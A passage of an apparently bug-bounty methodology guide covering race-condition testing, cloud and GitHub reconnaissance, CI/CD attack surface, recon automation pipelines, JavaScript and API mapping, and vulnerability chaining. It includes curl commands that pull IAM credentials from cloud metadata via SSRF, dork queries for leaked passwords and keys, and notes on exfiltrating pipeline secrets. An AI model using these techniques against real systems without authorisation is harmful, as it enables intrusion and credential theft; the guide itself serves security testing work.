headers = {"Authorization": "Bearer TOKEN"}

def send_request():
    requests.post(url, json=data, headers=headers)

threads = []
for i in range(20):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**3. Last-Byte Sync**:
Send requests simultaneously by controlling the last byte:
```python
# Send all but last byte of request
# Then send last byte simultaneously for all requests
```

### The Time-of-Check to Time-of-Use (TOCTOU) Pattern
Look for:
- Balance checks before transactions
- Inventory checks before purchases
- Permission checks before actions
- Rate limit checks before processing

---

## 40. Cloud Attack Surface Identification

### The Cloud Reconnaissance Stack

**AWS**:
- S3 buckets: `target-backups`, `target-assets`, `target-dev`
- EC2 instances: Public IPs, security groups
- Lambda functions: Public URLs via API Gateway
- IAM roles: Instance metadata access
- CloudFront distributions: Origin discovery
- Route53: DNS records, hosted zones

**GCP**:
- Cloud Storage buckets
- Compute Engine instances
- Cloud Functions
- App Engine apps
- Firebase projects

**Azure**:
- Blob Storage containers
- Virtual Machines
- Functions
- App Services

### Cloud Discovery Techniques

**1. S3 Bucket Discovery**:
```bash
# Common naming patterns
target.com
assets.target.com
target-backups
target-dev
target-staging
target-logs
target-data

# DNS-based discovery
dig assets.target.com
# If CNAME to s3.amazonaws.com, it's an S3 bucket

# Brute-forcing
# Use tools like s3scanner, cloud_enum
```

**2. Google Dorking for Cloud**:
```
site:s3.amazonaws.com "target.com"
site:blob.core.windows.net "target"
site:storage.googleapis.com "target"
```

**3. Metadata Service Access**:
```bash
# If SSRF exists, access metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/user-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**4. Cloud IP Range Scanning**:
```bash
# AWS IP ranges
https://ip-ranges.amazonaws.com/ip-ranges.json

# Scan for certificates containing target name
masscan -p443 -iL aws_ips.txt --max-rate 10000 | tee results.txt
```

---

## 41. GitHub Recon Methodologies

### The GitHub Recon Philosophy
"For anyone with development experience, this is the perfect place to start. Your goal is to find sensitive data/files available on public repositories."

### The Three GitHub Attack Vectors

**1. Company Organization Account**:
- Find repos that should be private but are public
- Look for leaked API keys, passwords, secrets
- Check for internal documentation, architecture diagrams
- Analyze commit history for removed secrets (still in git history)

**2. Employee Personal Accounts**:
- Use LinkedIn to find developers
- Find their personal GitHub accounts
- Look for test code, side projects, forks of company repos
- Developers often test on personal repos with live domains/credentials

**3. String Search Across All Public GitHub**:
- Search for company name + sensitive keywords
- Search for apex domain + scripting languages (bash, python)
- Search for specific code patterns

### GitHub Search Operators
```
org:targetcompany "api_key"
org:targetcompany "password"
org:targetcompany "secret"
org:targetcompany "token"
org:targetcompany "TODO"
org:targetcompany "vulnerable"
org:targetcompany "http://" "https://"
org:targetcompany "CSRF"
org:targetcompany "random"
org:targetcompany "hash"
org:targetcompany "MD5" OR "SHA-1" OR "SHA-256"
org:targetcompany "HMAC"

# Cross-org search
"target.com" "dev"
"dev.target.com"
"target.com" API_key
"target.com" password
"api.target.com" authorization
```

### The GitHub Issues Gold Mine
Companies share infrastructure details in issue discussions:
```
Chris: "Oh, hey John. We forgot to add this certificate to this domain: vuln.example.com."
→ Noted. New subdomain discovered.
```

### GitHub Recon Tools
```bash
# Gitrob
gitrob [options] target

# TruffleHog (git history)
trufflehog --regex --entropy=False https://github.com/org/repo.git

# Git-all-secrets (comprehensive)
docker run -it abhartiya/tools_gitallsecrets -token=<token> -org=<org>

# GitGraber (real-time monitoring)
python3 gitGraber.py -k wordlists/keywords.txt -q "target" -s
```

### The Manual GitHub Recon Workflow
1. Google "TargetCompany GitHub" → find org page
2. Filter by Type: Sources (not forks)
3. Note programming languages
4. Search for specific keywords in code
5. Check Issues and Pull Requests for infrastructure details
6. Check commit history for removed secrets
7. Check Gists for code snippets with credentials

---

## 42. CI/CD Recon Methodologies

### The CI/CD Attack Surface
CI/CD pipelines often have:
- Access to production credentials
- Build artifacts with embedded secrets
- Deployment scripts with hardcoded tokens
- Test environments with weak auth

### CI/CD Discovery

**1. Jenkins**:
```bash
# Shodan query for Jenkins
org:"TargetCompany" x-jenkins:200

# Common paths
/jenkins
/ci
/build
/hudson
```

**2. GitHub Actions**:
```bash
# Look for workflow files
org:targetcompany path:.github/workflows

# Check for secrets in workflow files
org:targetcompany "secrets." path:.github/workflows
```

**3. GitLab CI**:
```bash
# Look for .gitlab-ci.yml
org:targetcompany filename:.gitlab-ci.yml
```

**4. Travis CI, CircleCI**:
- Check for configuration files in repos
- Look for encrypted variables (may be decryptable)

### CI/CD Exploitation
- **Build Artifact Leaks**: Download build artifacts, extract secrets
- **Environment Variable Exposure**: CI logs may leak env vars
- **Pipeline Injection**: Modify CI config to exfiltrate secrets
- **Dependency Confusion**: Inject malicious packages into build

---

## 43. Recon Automation Pipelines

### The Pipeline Philosophy
Automation scales recon. Manual work scales understanding. Use automation for enumeration, manual work for exploitation.

### The Full Recon Pipeline

```bash
# Stage 1: Apex Domain Discovery
amass intel -whois -d target.com > apex_domains.txt

# Stage 2: Subdomain Enumeration (Passive)
amass enum --passive -df apex_domains.txt -o subdomains_passive.txt
subfinder -dL apex_domains.txt -all -o subdomains_subfinder.txt
assetfinder --subs-only < apex_domains.txt > subdomains_assetfinder.txt

# Stage 3: Subdomain Brute-Forcing (Active)
cat subdomains_passive.txt subdomains_subfinder.txt subdomains_assetfinder.txt | sort -u > all_subdomains.txt
cat all_subdomains.txt | dnsgen - > permutations.txt
./bin/massdns -r lists/resolvers.txt -t A permutations.txt > resolved.txt

# Stage 4: HTTP Probing
cat resolved.txt | httpx -silent -mc 200,301,302,401,403,500 -o live_urls.txt

# Stage 5: Screenshot Analysis
cat live_urls.txt | aquatone -out screenshots/

# Stage 6: Technology Fingerprinting
cat live_urls.txt | httpx -tech-detect -o tech_fingerprint.txt

# Stage 7: Content Discovery
ffuf -w wordlist.txt -u https://target/FUZZ -mc 200,204,301,302,401,403 -o content_discovery.txt

# Stage 8: JavaScript Analysis
cat live_urls.txt | katana -d 5 -jc -o js_files.txt
cat js_files.txt | grep "\.js$" | xargs -I@ curl -s @ -o js/$(basename @)
python linkfinder.py -i js/ -o endpoints.txt

# Stage 9: Wide-Band Scanning
nuclei -l live_urls.txt -t nuclei-templates/ -severity medium,high,critical -o nuclei_results.txt

# Stage 10: Target Selection
# Manual review of screenshots, tech fingerprints, nuclei results
# Select 3-5 targets for deep testing
```

### Automation Tools

**rengine**: https://github.com/yogeshojha/rengine
- Web-based reconnaissance framework
- Subdomain scanning, port scanning, vulnerability scanning
- Scheduled scans, reporting

**reconftw**: https://github.com/six2dez/reconftw
- Full reconnaissance pipeline in bash
- Subdomain enumeration, web probing, vulnerability scanning
- OSINT, GitHub recon, cloud recon

**Osmedeus**: https://github.com/j3ssie/Osmedeus
- Fully automated offensive security framework
- Reconnaissance, scanning, exploitation

**lazyrecon**: https://github.com/nahamsec/lazyrecon
- Simple bash script for reconnaissance
- Subdomain enumeration, screenshotting, directory brute-forcing

---

## 44. Nuclei Workflow Methodologies

### The Nuclei Philosophy
Nuclei is the backbone of wide-band scanning. But elite hunters don't just run default templates — they build custom templates for what others miss.

### The Nuclei Workflow

**1. Initial Wide Scan**:
```bash
# Scan all live URLs with medium+ severity
nuclei -l live_urls.txt -t nuclei-templates/ -severity medium,high,critical -o nuclei_wide.txt

# Focus on specific template categories
nuclei -l live_urls.txt -t http/ -o nuclei_http.txt
nuclei -l live_urls.txt -t ssl/ -o nuclei_ssl.txt
nuclei -l live_urls.txt -t dns/ -o nuclei_dns.txt
```

**2. Targeted Scanning**:
```bash
# API-specific templates
nuclei -l api_endpoints.txt -t http/api/ -severity medium,high,critical

# JavaScript-specific
nuclei -l js_files.txt -t http/exposures/ -o nuclei_js.txt

# Technology-specific
nuclei -l live_urls.txt -t technologies/ -o nuclei_tech.txt
```

**3. Custom Template Development**:
```yaml
# Example: Custom template for hidden admin panel
id: hidden-admin-panel

info:
  name: Hidden Admin Panel
  author: hunter
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin-panel-v2"
      - "{{BaseURL}}/backend/console"
      - "{{BaseURL}}/internal/dashboard"

    matchers:
      - type: word
        words:
          - "Dashboard"
          - "Admin"
          - "Console"
        condition: or
```

**4. CVE Spraying**:
```bash
# When new CVE drops, build template quickly
# Be faster than public template repositories
nuclei -l live_urls.txt -t custom-cve-template.yaml -o cve_results.txt
```

### The Future Bugs Strategy
Instead of looking for attack vectors others miss, look for new CVEs before anyone else:
1. New CVE announced affecting target's stack
2. Build identification check (custom Nuclei template or script)
3. Scan entire attack surface quickly
4. Report before others can test

---

## 45. Fuzzing Workflows

### The Fuzzing Philosophy
Fuzzing is systematic exploration of unknown application behavior. It's not guesswork — it's methodical hypothesis testing.

### The Fuzzing Types

**1. Path Fuzzing**:
```bash
# Directory discovery
ffuf -w /path/to/wordlist -u https://target/FUZZ

# With extensions
ffuf -w /path/to/wordlist -u https://target/FUZZ -e .php,.html,.bak,.old

# Recursive
ffuf -w /path/to/wordlist -u https://target/FUZZ -recursion -recursion-depth 2
```

**2. Parameter Fuzzing**:
```bash
# GET parameter discovery
ffuf -w /path/to/params.txt -u https://target/page?FUZZ=test -fs 4242

# POST parameter discovery
ffuf -w /path/to/params.txt -u https://target/api -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded"

# JSON parameter discovery
ffuf -w /path/to/params.txt -u https://target/api -X POST -d '{"FUZZ":"test"}' -H "Content-Type: application/json"
```

**3. Value Fuzzing**:
```bash
# Fuzz parameter values
ffuf -w /path/to/values.txt -u https://target/api?param=FUZZ

# IDOR testing with numeric values
seq 1 1000 | ffuf -w - -u https://target/api/users/FUZZ -H "Authorization: Bearer TOKEN"
```

**4. Header Fuzzing**:
```bash
# Hidden header discovery
ffuf -w /path/to/headers.txt -u https://target/api -H "FUZZ: test"

# X-Forwarded-For bypass testing
ffuf -w /path/to/ips.txt -u https://target/admin -H "X-Forwarded-For: FUZZ"
```

### The Wordlist Strategy
- **Generic**: SecLists, raft-large-words.txt
- **Target-Specific**: Extract words from target's website (CeWL)
- **Technology-Specific**: WordPress, Drupal, ColdFusion wordlists
- **Custom**: Add findings from JavaScript analysis, GitHub recon

### The Filtering Strategy
```bash
# Filter by status code
ffuf -w wordlist.txt -u https://target/FUZZ -mc 200,301,302,401,403

# Filter by response size (remove common error page)
ffuf -w wordlist.txt -u https://target/FUZZ -fs 4242

# Filter by word count
ffuf -w wordlist.txt -u https://target/FUZZ -fw 100

# Filter by line count
ffuf -w wordlist.txt -u https://target/FUZZ -fl 10

# Auto-calibration (learn and filter common responses)
ffuf -w wordlist.txt -u https://target/FUZZ -ac
```

---

## 46. Chaining Methodologies

### The Chaining Philosophy
Single vulnerabilities are often low severity. Chains create critical impact.

### The Chain Construction Framework

**Step 1: Find the Entry Point**:
- Information disclosure → leak internal path
- Debug endpoint → expose stack trace
- GitHub recon → leaked API key
- JavaScript analysis → hidden endpoint

**Step 2: Escalate Privileges**:
- Mass assignment → change role to admin
- IDOR → access admin functionality
- Auth bypass → access authenticated endpoints

**Step 3: Access Sensitive Data**:
- BOLA → read other users' data
- SSRF → access internal services
- SQL injection → dump database

**Step 4: Achieve Business Impact**:
- Account takeover → financial loss
- Data exfiltration → PII breach
- RCE → full system compromise

### Example Chains

**Chain 1: Information Disclosure → Auth Bypass → Account Takeover**:
```
1. JavaScript analysis reveals /api/internal/reset-password endpoint
2. No authentication required on endpoint (auth bypass)
3. No rate limiting → brute force token
4. Account takeover of any user
```

**Chain 2: GitHub Recon → SSRF → Cloud Metadata → IAM Credentials**:
```
1. GitHub reveals webhook endpoint pattern
2. Webhook accepts user-controlled URL (SSRF)
3. SSRF to 169.254.169.254 (cloud metadata)
4. Extract IAM role credentials
5. Access cloud resources
```

**Chain 3: Subdomain Takeover → Cookie Hijacking → Session Fixation**:
```
1. Find dangling CNAME (subdomain takeover)
2. Host malicious content on taken subdomain
3. Set cookies for parent domain
4. Hijack sessions
```

---

## 47. Real-World Hunter Workflows

### Workflow 1: The Recon-Heavy Hunter
**Profile**: Prefers finding bugs through deep recon rather than manual testing

**Daily Routine**:
1. Run automated recon on 5-10 new targets
2. Analyze screenshots for anomalies
3. Check Nuclei results for misconfigurations
4. GitHub recon for secrets
5. Report information disclosures, subdomain takeovers, leaked secrets
6. When interesting target found, switch to deep testing

**Strengths**: Scales well, finds low-hanging fruit quickly
**Weaknesses**: May miss complex logic bugs

### Workflow 2: The Logic-Focused Hunter
**Profile**: Prefers deep understanding of one target over breadth

**Daily Routine**:
1. Select one complex target (SaaS, fintech, marketplace)
2. Walk through every feature manually
3. Map business logic, data flows, state machines
4. Build hypotheses about weak mechanisms
5. Test hypotheses systematically
6. Chain small findings into critical bugs

**Strengths**: Finds high-payout bugs, builds deep expertise
**Weaknesses**: Slower, requires more domain knowledge

### Workflow 3: The CVE Sprayer
**Profile**: Focuses on newly released CVEs

**Daily Routine**:
1. Monitor CVE databases, security advisories
2. Identify CVEs affecting target's technology stack
3. Build detection scripts/templates quickly
4. Scan entire attack surface
5. Report before public PoCs exist

**Strengths**: Very fast, high impact when successful
**Weaknesses**: Race against other hunters, requires technical depth

### Workflow 4: The JavaScript Analyst
**Profile**: Specializes in frontend code analysis

**Daily Routine**:
1. Crawl target's JavaScript files
2. Extract endpoints, parameters, secrets
3. Analyze source maps if available
4. Monitor for changes (new deployments)
5. Test hidden endpoints, debug parameters
6. Focus on mass assignment, IDOR, auth bypass

**Strengths**: Finds what scanners miss, high ROI
**Weaknesses**: Requires patience, technical JavaScript knowledge

---

## 48. Real Recon Case Studies

### Case Study 1: The LinkedIn + GitHub Apex Domain Discovery
**Target**: Wide-scope tech company
**Method**: 
1. Used LinkedIn to find 50+ developers
2. Found their personal GitHub accounts
3. One developer had a test repo with hardcoded `staging-api.target.com`
4. Staging API had no authentication on admin endpoints
5. Result: Critical vulnerability, $15,000 bounty

**Lesson**: Personal developer repos are gold mines for undiscovered assets.

### Case Study 2: The JavaScript Ghost Feature
**Target**: E-commerce platform
**Method**:
1. Analyzed JavaScript bundle after new deployment
2. Found orphaned function `applyDiscount(code, percentage)`
3. UI had no discount input field (feature "removed")
4. Called API directly with `percentage: 100`
5. Result: Free order vulnerability, $8,000 bounty

**Lesson**: "Removed" features often still exist in the API.

### Case Study 3: The Certificate Transparency Deep Dive
**Target**: Financial services company
**Method**:
1. Monitored Certspotter for new certificates
2. Found certificate for `internal-api-v2.target.com`
3. Subdomain not in any DNS record (internal-only)
4. But certificate was valid and server responded to direct IP access
5. Result: Internal API exposed, $25,000 bounty

**Lesson**: Certificate transparency reveals assets before DNS does.

### Case Study 4: The Acquisition Surface Expansion
**Target**: Large tech company with wide scope
**Method**:
1. Tracked acquisitions via Crunchbase
2. Company acquired smaller startup 3 months ago
3. Startup's domains still had old auth mechanisms
4. One domain had OAuth misconfiguration allowing account takeover
5. Result: Account takeover on acquired platform, $12,000 bounty

**Lesson**: Acquisitions immediately expand scope with untested assets.

---

## 49. Real Bug Bounty Methodologies

### Methodology 1: The Jason Haddix Linked Target Discovery
```
1. Turn off passive scanning in Burp
2. Set forms auto-submit
3. Set scope to advanced control and use string of target name (not FQDN)
4. Walk+browse, then spider all hosts recursively
5. Profit (more targets)
```

### Methodology 2: The NahamSec Recon Balance
```
"Recon shouldn't just be limited to finding assets and outdated stuff. 
It's also understanding the app and finding functionality that's not easily accessible. 
There needs to be a balance between recon and good old hacking on the application 
in order to be successful."
```

### Methodology 3: The R-s0n Ebb & Flow
```
1. Move down recon until you have 3-5 attack vectors
2. Spend time testing those vectors (20-30 min max)
3. When stuck, put a pin in them
4. Return to recon, try new tools/techniques
5. Choose 3-5 new attack vectors
6. Repeat until success
```

### Methodology 4: The API Hunter's Mass Assignment Flow
```
1. Identify candidate endpoints (POST/PATCH/PUT that create/update)
2. Capture normal legitimate request (baseline)
3. Observe response: does it return more fields than sent?
4. Add extra sensitive fields to request (role, is_admin, etc.)
5. Send modified request
6. Observe: status code, response body, silent success
7. Verify impact: log out/in, check admin endpoints, check UI changes
8. Escalate: privilege escalation, account takeover, data manipulation
```

### Methodology 5: The JavaScript Recon Pipeline
```
1. Gather all JS files (active crawl + passive archive)
2. Download and beautify
3. Extract endpoints (LinkFinder, xnLinkFinder)
4. Extract secrets (TruffleHog, SecretFinder)
5. Extract parameters (grep for feature flags, debug params)
6. Identify tech stack (frameworks, third-party services)
7. Check for source maps
8. Reconstruct API map
9. Test hidden endpoints with various auth levels
10. Monitor for changes (diff new deployments)
```

---

## 50. Toolchains Used By Elite Hunters

### The Core Recon Toolkit

**Subdomain Enumeration**:
- Amass (OWASP) — backbone of recon
- Subfinder (ProjectDiscovery)
- Assetfinder (TomNomNom)
- Findomain
- Censys enumeration
- dnsgen + massdns

**HTTP Probing**:
- httpx (ProjectDiscovery)
- httprobe

**Content Discovery**:
- ffuf — primary fuzzer
- Gobuster
- dirsearch
- feroxbuster
- Burp Intruder

**JavaScript Analysis**:
- LinkFinder
- xnLinkFinder
- SecretFinder
- getJS
- katana (crawler)
- hakrawler
- gospider

**API Discovery**:
- Kiterunner
- Arjun
- ParamSpider
- x8

**Wide-Band Scanning**:
- Nuclei (ProjectDiscovery)
- Semgrep (SAST on client-side code)

**Screenshot Analysis**:
- EyeWitness
- Aquatone
- Nuclei headless

**Port Scanning**:
- Masscan
- Nmap
- DNMasscan

**GitHub Recon**:
- Gitrob
- TruffleHog
- git-all-secrets
- GitGraber
- shhgit

**Secret Scanning**:
- TruffleHog
- GitLeaks
- SecretFinder

**Source Map Analysis**:
- sourcemapper
- restore-source-tree

**GraphQL Testing**:
- Clairvoyance
- graphql-path-enum
- InQL (Burp extension)

**Race Condition Testing**:
- Turbo Intruder
- Custom Python scripts

**Request Smuggling**:
- HTTP Request Smuggler (Burp)
- smuggler.py

**Cache Poisoning**:
- Param Miner (Burp)
- Web Cache Deception scanner

**Automation Frameworks**:
- rengine
- reconftw
- Osmedeus
- lazyrecon

---

## 51. Recon Pipelines

### Pipeline 1: The Quick Recon (30 minutes)
```bash
# 1. Subdomain enumeration
echo "target.com" | subfinder -silent | anew subs.txt

# 2. HTTP probing
cat subs.txt | httpx -silent -o live.txt

# 3. Screenshot
cat live.txt | aquatone -out screenshots/

# 4. Quick Nuclei scan
nuclei -l live.txt -severity critical,high -o nuc.txt

# 5. JavaScript crawl
cat live.txt | katana -d 3 -jc -o js.txt

# 6. Manual review of screenshots and Nuclei results
```

### Pipeline 2: The Deep Recon (1-2 days)
```bash
# 1. Apex domain discovery
amass intel -whois -d target.com > apex.txt

# 2. Comprehensive subdomain enumeration
amass enum --passive -df apex.txt -o amass_passive.txt
subfinder -dL apex.txt -all -o subfinder.txt
assetfinder --subs-only < apex.txt > assetfinder.txt
cat amass_passive.txt subfinder.txt assetfinder.txt | sort -u > all_subs.txt

# 3. Permutation generation
cat all_subs.txt | dnsgen - > permutations.txt

# 4. Resolution
./bin/massdns -r lists/resolvers.txt -t A permutations.txt > resolved.txt

# 5. HTTP probing
cat resolved.txt | httpx -silent -mc 200,301,302,401,403,500 -o live.txt

# 6. Port scanning
cat live.txt | dnsx -a -resp-only | sort -u > ips.txt
masscan -iL ips.txt -p0-65535 --max-rate 10000 -oG masscan.txt

# 7. Screenshot analysis
cat live.txt | aquatone -out screenshots/
cat live.txt | eyewitness --web

# 8. Technology fingerprinting
cat live.txt | httpx -tech-detect -o tech.txt

# 9. Content discovery
ffuf -w wordlist.txt -u https://target/FUZZ -mc 200,204,301,302,401,403 -o content.txt

# 10. JavaScript analysis
cat live.txt | katana -d 5 -jc -o js_files.txt
cat js_files.txt | grep "\.js$" | xargs -I@ curl -s @ -o js/$(basename @)
python linkfinder.py -i js/ -o endpoints.txt

# 11. GitHub recon
# Manual: org:target "api_key", org:target "password", etc.

# 12. Wide-band scanning
nuclei -l live.txt -t nuclei-templates/ -severity medium,high,critical -o nuclei.txt

# 13. Target selection
# Manual review of all data
```

### Pipeline 3: The Continuous Monitoring
```bash
# Cron job: Run daily
# 1. Subdomain monitoring
# 2. JavaScript change detection
# 3. Certificate transparency monitoring
# 4. New endpoint detection
# 5. Nuclei scan with new templates

# Example cron:
0 */12 * * * cd /root/recon/ && ./run_recon.sh target.com >> /root/recon/log.txt 2>&1
```

---

## 52. JS Reversing Pipelines

### Pipeline 1: Quick JS Analysis (15 minutes)
```bash
# 1. Find JS files
curl -s https://target.com | grep -oE "https?://[^"']+\.js" | sort -u > js.txt

# 2. Download
cat js.txt | xargs -I@ curl -s @ -o js/$(basename @)

# 3. Beautify
for f in js/*.js; do js-beautify -f $f -o pretty/$(basename $f); done

# 4. Extract endpoints
cat pretty/*.js | grep -oE "['"]/[a-zA-Z0-9_?&=/\-\#\.]*['"]" | sort -u > endpoints.txt

# 5. Search for secrets
cat pretty/*.js | grep -i "api_key\|secret\|token\|password" > secrets.txt

# 6. Check for source maps
cat js.txt | while read url; do curl -s -o /dev/null -w "%{http_code}" "$url.map"; done
```

### Pipeline 2: Deep JS Reversing (2-4 hours)
```bash
# 1. Comprehensive JS discovery (active + passive)
echo "target.com" | gau | grep "\.js$" | sort -u > all_js.txt
cat all_js.txt | httpx -mc 200 > live_js.txt

# 2. Download all versions
mkdir -p js_analysis
cat live_js.txt | xargs -I@ curl -s @ -o js_analysis/$(basename @)

# 3. Beautify all
mkdir -p pretty_js
for f in js_analysis/*.js; do js-beautify -f $f -o pretty_js/$(basename $f); done

# 4. Source map discovery
cat live_js.txt | while read url; do 
  status=$(curl -s -o /dev/null -w "%{http_code}" "$url.map")
  if [ "$status" = "200" ]; then
    echo "$url.map" >> sourcemaps.txt
    curl -s "$url.map" -o maps/$(basename $url).map
  fi
done

# 5. Source map reconstruction
mkdir -p reconstructed
for f in maps/*.map; do
  sourcemapper map -i $f -o reconstructed/$(basename $f .map)/
done

# 6. Endpoint extraction
python linkfinder.py -i pretty_js/ -o linkfinder_results.html
xnLinkFinder -i pretty_js/ -o xnlinkfinder_results.txt

# 7. Secret extraction
trufflehog filesystem js_analysis/ -o trufflehog_results.txt
cat pretty_js/*.js | grep -oE "[a-zA-Z0-9_-]{32,64}" | sort -u > high_entropy.txt

# 8. Parameter discovery
cat pretty_js/*.js | grep -oE "[a-zA-Z_][a-zA-Z0-9_]*=[a-zA-Z0-9_]*" | grep -i "debug\|admin\|test\|beta\|internal" > params.txt

# 9. Tech stack identification
cat pretty_js/*.js | grep -i "react\|vue\|angular\|webpack\|vite" > tech.txt
cat pretty_js/*.js | grep -i "sentry\|intercom\|stripe\|firebase" > services.txt

# 10. Build API map
cat linkfinder_results.txt xnlinkfinder_results.txt | sort -u > api_map.txt

# 11. Test extracted endpoints
cat api_map.txt | httpx -silent -mc 200,401,403 -o live_endpoints.txt

# 12. Auth testing on live endpoints
# Manual: test with no auth, user auth, admin auth
```

---

## 53. API Mapping Pipelines

### Pipeline 1: API Surface Discovery
```bash
# 1. Passive collection
waymore -i target.com -mode U -oU wayurls.txt
echo "target.com" | gau --threads 10 --subs | anew gauurls.txt
cat wayurls.txt gauurls.txt | uro | sort -u > all_urls.txt

# 2. JS leakage extraction
cat all_urls.txt | xargs -I@ curl -s @ | grep -oE "(['"])/(api|rest|graphql|v[1-9]|internal|private|admin|debug|beta|mobile|app)[a-zA-Z0-9_/-]*\x01" | tr -d "'"" | anew js_endpoints.txt

# 3. Active brute-forcing
ffuf -u https://api.target.com/FUZZ -w api_routes.txt -mc 200,201,204,301,302,401,403 -ac -o ffuf_results.txt
kr scan https://api.target.com -w routes-large.kite -o kr_results.txt

# 4. Method variation
cat js_endpoints.txt ffuf_results.txt | sort -u > all_endpoints.txt
cat all_endpoints.txt | xargs -I@ bash -c 'for m in GET POST PUT DELETE PATCH OPTIONS; do curl -s -X $m -o /dev/null -w "%{http_code} $m @\n" @; done' | grep -v "404\|405" > method_variations.txt

# 5. Parameter discovery
arjun -u https://api.target.com/endpoint -m POST --stable -o arjun_results.txt
ffuf -u https://api.target.com/endpoint?FUZZ=test -w params.txt -mc 200,301 -ac

# 6. No-auth testing
cat all_endpoints.txt | httpx -silent -mc 200 -fc 401,403 > noauth.txt

# 7. Documentation discovery
ffuf -u https://api.target.com/FUZZ -w swagger_wordlist.txt -mc 200 -ac
```

### Pipeline 2: API Deep Testing
```bash
# 1. Capture legitimate traffic
# Use Burp Proxy, mitmproxy, or browser DevTools
# Save all API requests

# 2. Analyze request patterns
# - Authentication mechanism
# - Parameter types and validation
# - Response structures
# - Error handling

# 3. Build test cases
# For each endpoint:
#   - Test with no auth
#   - Test with different user auth
#   - Test with admin auth
#   - Test all HTTP methods
#   - Test content-type switching
#   - Test parameter pollution
#   - Test mass assignment
#   - Test BOLA (ID swapping)

# 4. Automated testing with Nuclei
nuclei -l all_endpoints.txt -t http/api/ -severity medium,high,critical

# 5. Manual validation of interesting findings
# Burp Repeater for PoC construction
```

---

## 54. Notes From Real Hunters

### On Recon
> "The bugs are at the far ends of the bell curve." — R-s0n
> 
> Everyone runs Amass. The elite hunter finds what Amass misses.

### On JavaScript
> "Modern web applications are essentially handing you their blueprint. Every time someone loads a React, Vue, or Angular app, the server sends over a massive JavaScript bundle that contains way more than just UI logic."
> 
> "Developers often 'remove' features by just hiding the UI button. But the actual function? Still sitting in the JavaScript bundle."

### On Methodology
> "Your hunting should come 'in' and 'out' of recon methodology like the ocean tides. Move down the list until you have 3-5 attack vectors. Spend some time testing, but not too long. When stuck, put a pin in it and go back to recon."

### On Target Selection
> "Outdated NPM packages, expired certificates, or an old copyright might mean a web application hasn't been maintained by the company and could be vulnerable to newer attack techniques. Targets deep into recon and very difficult to find will be missed by other researchers."

### On Business Logic
> "Focus on site functionality that has been redesigned or changed since a previous version. Developers often point out the areas they think they are weak in. They want you to succeed."

### On GitHub Recon
> "There's a famous joke that senior engineers are just really good at 'Googling'. Inexperienced developers sometimes post code snippets to ask for help or use public storage services to share code."
> 
> "Issues is the gold mine. Companies share so much information about their infrastructure in issue discussions and debates."

### On API Hunting
> "APIs power ~85%+ of modern web & mobile traffic. Most bug-bounty payouts above $5,000–$30,000 come from APIs — not reflected XSS in contact forms."
> 
> "Focus on business logic > automated scanners. Chain small issues (403 endpoint + param fuzz → 200 takeover)."

### On Frustration
> "The feeling of being frustrated means you are growing, just like the feeling of pain in your muscles means you're building muscle. Embrace the frustration, dive into it head first, and push through it."

### On Automation
> "You either need to find and report them first, or find ones that others are missing. It's much easier to be creative than fast, in my opinion, but to each their own!"

### On the Hunter's Mindset
> "The best bug hunters aren't always the best exploiters — they're the best researchers."
> 
> "Before you touch a burp proxy or write a payload, you need to know what you're looking at."

---

## 55. Research References

### Core Methodology Repositories
- https://github.com/KingOfBugbounty/KingOfBugBountyTips
- https://github.com/R-s0n/bug-bounty-village-defcon32-workshop/blob/main/recon-methodology.md
- https://github.com/devanshbatham/Awesome-Bugbounty-Writeups
- https://github.com/ngalongc/bug-bounty-reference
- https://github.com/djadmin/awesome-bug-bounty
- https://github.com/vavkamil/awesome-bugbounty-tools
- https://github.com/0x4ymn/PENTESTING_BIBLE
- https://github.com/HolyBugx/HolyTips

### Real Recon + Hunter Thinking
- https://infosecwriteups.com/recon-everything-48aafbb8987
- https://medium.com/@Purushothamr/github-recon-where-the-real-bugs-quietly-begin-72169baa58c8
- https://medium.com/@manojxshrestha/api-bug-bounty-mastery-2026-hunt-hidden-endpoints-to-land-10k-payouts-957832efc29c
- https://blogs.jsmon.sh/how-to-perform-javascript-reconnaissance-for-bug-bounties/
- https://www.yeswehack.com/learn-bug-bounty/discover-map-hidden-endpoints-parameters
- https://osintteam.blog/how-i-entered-the-world-of-bug-hunting-and-discovered-the-power-of-recon-c4914bc02554
- https://medium.com/@batuhanaydinn/bug-bounty-recon-for-everyone-220ae026a42c
- https://infosecwriteups.com/3-understanding-reconnaissance-finding-the-unseen-8c7a91b89c35
- https://systemweakness.com/github-recon-dorking-mastery-the-secret-techniques-top-hunters-use-to-find-critical-bugs-2026-b51cbcf33591
- https://cybersecuritywriteups.com/the-definitive-guide-to-github-recon-lessons-from-analyzing-100-reports-bd5d4891a815

### API + Functionality Mapping
- https://portswigger.net/web-security/api-testing
- https://portswigger.net/web-security/graphql
- https://owasp.org/www-project-web-security-testing-guide/
- https://book.hacktricks.wiki/en/index.html
- https://github.com/swisskyrepo/PayloadsAllTheThings

### JavaScript Recon + Reversing
- https://github.com/GerbenJavado/LinkFinder
- https://github.com/m4ll0k/SecretFinder
- https://github.com/xnl-h4ck3r/xnLinkFinder
- https://github.com/edoardottt/cariddi
- https://github.com/003random/getJS
- https://github.com/dwisiswant0/domxssscanner
- https://github.com/fransr/postMessage-tracker
- https://github.com/yeswehack/pp-finder

### Recon Automation Pipelines
- https://github.com/yogeshojha/rengine
- https://github.com/six2dez/reconftw
- https://github.com/j3ssie/Osmedeus
- https://github.com/0x727/ObserverWard
- https://github.com/nahamsec/lazyrecon

### Recon + Enumeration Tooling
- https://github.com/projectdiscovery/subfinder
- https://github.com/projectdiscovery/httpx
- https://github.com/projectdiscovery/katana
- https://github.com/projectdiscovery/uncover
- https://github.com/projectdiscovery/interactsh
- https://github.com/projectdiscovery/notify
- https://github.com/projectdiscovery/naabu
- https://github.com/projectdiscovery/dnsx
- https://github.com/projectdiscovery/asnmap
- https://github.com/projectdiscovery/mapcidr
- https://github.com/projectdiscovery/cdncheck
- https://github.com/projectdiscovery/tlsx
- https://github.com/projectdiscovery/alterx
- https://github.com/projectdiscovery/nuclei
- https://github.com/projectdiscovery/nuclei-templates
- https://github.com/lc/gau
- https://github.com/tomnomnom/waybackurls
- https://github.com/tomnomnom/qsreplace
- https://github.com/tomnomnom/gf
- https://github.com/tomnomnom/anew
- https://github.com/tomnomnom/unfurl
- https://github.com/tomnomnom/assetfinder
